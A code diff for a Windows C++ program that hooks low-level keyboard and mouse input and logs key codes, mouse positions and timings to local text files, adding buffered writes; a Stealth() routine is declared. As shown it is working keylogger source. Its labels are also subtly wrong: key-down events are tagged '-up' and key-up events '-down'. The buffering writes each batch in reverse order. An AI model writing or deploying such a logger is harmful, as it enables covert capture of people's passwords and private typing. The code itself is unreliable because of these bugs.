@@ -3,28 +3,63 @@
 #include <winuser.h>
 #include <stdio.h>
 #include <fstream>
+#include <list>
+#include <cstring>
+#include <string>
+#include <sstream>
+
 using namespace std;
 #define key_log_file "key_log.txt"
 #define mouse_log_file "mouse_log.txt"
 
+list<string> mouse_buffer = list<string>();
+list<string> key_buffer = list<string>();
 int Save (fstream file);
 void Stealth();
 fstream file;
 
+void save_to_file(){
+    if(key_buffer.size() >= 50){
+        file.open(key_log_file , ios::app | ios::out);
+        while(! key_buffer.empty()){
+            file<<key_buffer.front();
+            key_buffer.pop_front();
+        }
+        file.close();
+    }
+
+    if(mouse_buffer.size() >= 25){
+        file.open(mouse_log_file , ios::app | ios::out);
+        while(! mouse_buffer.empty()){
+            file<<mouse_buffer.front();
+            mouse_buffer.pop_front();
+        }
+    file.close();
+    }
+}
+
+
 LRESULT CALLBACK key_proc(int nCode,WPARAM wParam,LPARAM lParam)
 {
+    stringstream temp;
     PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
-    file.open(key_log_file , ios::app | ios::out);
+    //file.open(key_log_file , ios::app | ios::out);
     if(wParam == WM_KEYDOWN)
-        file << "-up\t" <<GetTickCount() <<  "\t" << p->vkCode << endl;
+        temp <<"-up\t"<<GetTickCount()<<"\t"<<p->vkCode<<endl;
     if(wParam == WM_KEYUP)
-        file << "-down\t" <<GetTickCount() <<  "\t" << p->vkCode << endl;
-    file.close();
+        temp <<"-down\t"<<GetTickCount()<<"\t"<<p->vkCode<<endl;
+    //file.close();
+
+    key_buffer.push_front(temp.str());
+
+    save_to_file();
+
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
 LRESULT CALLBACK mouse_proc(int nCode,WPARAM wParam,LPARAM lParam)
 {
+    stringstream temp;
     MOUSEHOOKSTRUCT* mouse = (MOUSEHOOKSTRUCT*)lParam;
     string move_type;
     switch(wParam)
@@ -50,9 +85,13 @@ LRESULT CALLBACK mouse_proc(int nCode,WPARAM wParam,LPARAM lParam)
     default:
         break;
     }
-    file.open(mouse_log_file , ios::out | ios::app);
-    file << move_type << "\t" << GetTickCount() << "\t" << (mouse->pt).x << "," << (mouse->pt).y<<endl;
-    file.close();
+    //file.open(mouse_log_file , ios::out | ios::app);
+    temp<<move_type<<"\t"<<GetTickCount()<<"\t"<<(mouse->pt).x<<"," <<(mouse->pt).y<<endl;
+    mouse_buffer.push_front(temp.str());
+
+    save_to_file();
+
+    //file.close();
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 int main()
